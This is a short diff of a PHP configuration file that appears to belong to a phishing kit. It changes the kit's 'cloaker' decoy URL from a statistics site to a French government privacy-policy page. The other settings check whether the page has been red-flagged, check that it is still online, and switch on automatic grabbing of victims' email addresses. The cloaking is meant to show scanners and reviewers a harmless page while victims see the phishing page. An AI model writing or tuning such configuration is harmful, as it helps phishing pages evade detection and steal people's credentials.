@@ -33,7 +33,7 @@ $redirection_link_check = false; // Check Your Page If Still Uploaded
 $check_red_page = False; // Check The Redirect If Red Flag
 
 $cloaker = [
-    "url_to_grab" => "https://www.worldometers.info", // Change the link you want to grap it in your link ( if t)
+    "url_to_grab" => "https://www.legifrance.gouv.fr/contenu/pied-de-page/politique-de-confidentialite", // Change the link you want to grap it in your link ( if t)
 ];
 
 $auto_grabber = true; // Activate Auto Grab Email
